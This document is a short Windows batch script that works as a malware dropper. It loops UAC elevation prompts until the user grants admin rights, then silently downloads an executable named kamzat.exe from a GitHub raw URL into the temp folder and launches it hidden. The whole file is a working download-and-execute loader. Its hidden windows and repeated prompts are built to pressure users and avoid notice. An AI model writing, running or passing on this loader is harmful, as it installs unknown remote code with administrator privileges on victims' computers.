@echo off
setlocal

REM Check for admin privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    goto admin_tasks
)

REM Elevate with UAC
:elevate_uac
powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
if %errorlevel% NEQ 0 (
    timeout /t 3 >nul
    goto elevate_uac
)
exit /b

:admin_tasks
REM Download and execute (hidden)
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe'" -WindowStyle Hidden
if exist "%TEMP%\kamzat.exe" (
    start "" /B "%TEMP%\kamzat.exe"
)
exit /b
